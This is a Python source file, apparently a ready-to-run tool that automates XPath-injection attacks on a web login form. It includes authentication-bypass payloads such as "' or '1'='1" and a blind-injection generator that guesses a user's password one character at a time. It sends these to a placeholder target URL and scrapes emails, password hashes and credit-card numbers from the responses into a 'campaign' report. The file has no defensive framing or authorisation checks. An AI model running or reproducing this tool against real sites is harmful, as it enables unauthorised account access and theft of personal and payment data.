from abc import ABC, abstractmethod
from typing import List, Optional, Dict, Any
from dataclasses import dataclass
import requests
import re
import logging
from datetime import datetime
from functools import wraps
import time
import random
from enum import Enum

class InjectionType(Enum):
    AUTHENTICATION = "auth"
    DATA_EXTRACTION = "data"
    ERROR_BASED = "error"
    BLIND = "blind"

@dataclass
class InjectionResult:
    success: bool
    payload: str
    response_data: Optional[str]
    execution_time: float
    vulnerability_type: InjectionType

class InjectionException(Exception):
    pass

def retry_on_failure(max_attempts: int = 3, delay: float = 1.0):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise InjectionException(f"Max attempts reached: {str(e)}")
                    time.sleep(delay * (attempt + 1))
            return None
        return wrapper
    return decorator

class LoggingMixin:
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.INFO)
        
    def log_injection_attempt(self, payload: str, result: bool):
        self.logger.info(f"Injection attempt: {payload} - Success: {result}")

class TimingMixin:
    @staticmethod
    def measure_execution_time(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            start_time = time.time()
            result = func(*args, **kwargs)
            execution_time = time.time() - start_time
            return result, execution_time
        return wrapper

class BaseInjector(ABC):
    @abstractmethod
    def generate_payload(self) -> str:
        pass

    @abstractmethod
    def execute_injection(self, payload: str) -> InjectionResult:
        pass

class PayloadGenerator(ABC):
    @abstractmethod
    def generate(self) -> List[str]:
        pass

class AuthenticationPayloadGenerator(PayloadGenerator):
    def generate(self) -> List[str]:
        return [
            "' or '1'='1",
            "' or 1=1--",
            "admin' or '1'='1' %00",
            "' or 1=1 and '1'='1",
            "admin')) or (('1'='1"
        ]

class BlindInjectionPayloadGenerator(PayloadGenerator):
    def generate(self) -> List[str]:
        return [
            f"' or substring((//user[position()=1]/password),1,1)='{char}'"
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        ]

class XPathInjector(BaseInjector, LoggingMixin, TimingMixin):
    def __init__(self, target_url: str):
        super().__init__()
        self.target_url = target_url
        self.session = requests.Session()
        self.successful_payloads: List[InjectionResult] = []
        self.payload_generators: Dict[InjectionType, PayloadGenerator] = {
            InjectionType.AUTHENTICATION: AuthenticationPayloadGenerator(),
            InjectionType.BLIND: BlindInjectionPayloadGenerator()
        }

    @retry_on_failure(max_attempts=3)
    def execute_injection(self, payload: str) -> InjectionResult:
        result, execution_time = self.measure_execution_time(self._send_request)(payload)
        
        injection_result = InjectionResult(
            success=self._check_success(result),
            payload=payload,
            response_data=self._extract_data(result),
            execution_time=execution_time,
            vulnerability_type=self._determine_vulnerability_type(payload)
        )
        
        self.log_injection_attempt(payload, injection_result.success)
        
        if injection_result.success:
            self.successful_payloads.append(injection_result)
            
        return injection_result

    def _send_request(self, payload: str) -> requests.Response:
        data = {
            "username": payload,
            "password": "anything"
        }
        return self.session.post(self.target_url, data=data)

    def _check_success(self, response: requests.Response) -> bool:
        success_indicators = ["Welcome", "Dashboard", "Profile", "Admin"]
        return any(indicator in response.text for indicator in success_indicators)

    def _extract_data(self, response: requests.Response) -> Optional[str]:
        patterns = {
            'email': r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}',
            'hash': r'[A-Fa-f0-9]{32,64}',
            'credit_card': r'\b\d{16}\b'
        }
        
        extracted_data = {}
        for key, pattern in patterns.items():
            if matches := re.findall(pattern, response.text):
                extracted_data[key] = matches
                
        return str(extracted_data) if extracted_data else None

    def _determine_vulnerability_type(self, payload: str) -> InjectionType:
        if "substring" in payload or "count" in payload:
            return InjectionType.BLIND
        if "or" in payload and "=" in payload:
            return InjectionType.AUTHENTICATION
        if "div" in payload or "invalid" in payload:
            return InjectionType.ERROR_BASED
        return InjectionType.DATA_EXTRACTION

class AutomatedInjector:
    def __init__(self, injector: XPathInjector):
        self.injector = injector
        self.results: List[InjectionResult] = []

    def run_campaign(self) -> None:
        for injection_type in InjectionType:
            if generator := self.injector.payload_generators.get(injection_type):
                payloads = generator.generate()
                for payload in payloads:
                    try:
                        result = self.injector.execute_injection(payload)
                        self.results.append(result)
                    except InjectionException as e:
                        logging.error(f"Failed to execute {payload}: {str(e)}")

    def generate_report(self) -> Dict[str, Any]:
        successful_attacks = [r for r in self.results if r.success]
        
        return {
            "total_attempts": len(self.results),
            "successful_attempts": len(successful_attacks),
            "success_rate": len(successful_attacks) / len(self.results) if self.results else 0,
            "vulnerable_types": set(r.vulnerability_type for r in successful_attacks),
            "fastest_successful_payload": min(successful_attacks, key=lambda x: x.execution_time) if successful_attacks else None,
            "extracted_data": [r.response_data for r in successful_attacks if r.response_data]
        }

def main():
    # Настройка логирования
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Создание и настройка инжектора
    target_url = "http://vulnerable-site.com/login"
    injector = XPathInjector(target_url)
    
    # Создание автоматизированного тестировщика
    automated_injector = AutomatedInjector(injector)
    
    print("Starting automated XPath injection campaign...")
    automated_injector.run_campaign()
    
    # Генерация и вывод отчета
    report = automated_injector.generate_report()
    print("\nCampaign Results:")
    print(f"Total attempts: {report['total_attempts']}")
    print(f"Successful attempts: {report['successful_attempts']}")
    print(f"Success rate: {report['success_rate']:.2%}")
    print("\nVulnerable types found:")
    for vuln_type in report['vulnerable_types']:
        print(f"- {vuln_type.value}")
    
    if report['fastest_successful_payload']:
        print(f"\nFastest successful payload: {report['fastest_successful_payload'].payload}")
        print(f"Execution time: {report['fastest_successful_payload'].execution_time:.3f} seconds")
    
    if report['extracted_data']:
        print("\nExtracted sensitive data:")
        for data in report['extracted_data']:
            print(f"- {data}")

if __name__ == "__main__":
    main()
